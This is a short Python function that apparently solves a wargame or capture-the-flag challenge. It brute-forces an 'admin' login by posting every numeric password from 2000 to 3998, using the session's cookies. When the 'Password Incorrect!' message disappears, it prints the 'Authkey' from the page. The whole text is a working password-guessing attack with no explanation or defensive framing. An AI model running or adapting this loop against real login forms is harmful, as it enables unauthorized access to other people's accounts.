def part2(session, URL, cookie):
    for i in range(2000, 3999) :
        data2={
            "id":"admin",
            "pw":i
           }

        req2=session.post(URL, cookies=cookie, data=data2)
        if (req2.text.find("Password Incorrect!") == -1 ) :
            index=req2.text.find("Authkey")
            print ("\n\n")
            print (req2.text[index:index+30])
            print ("\n\n")
            input("Press Any KEY to exit......")
            exit (0)
#        else :
#            print ("proc 2")

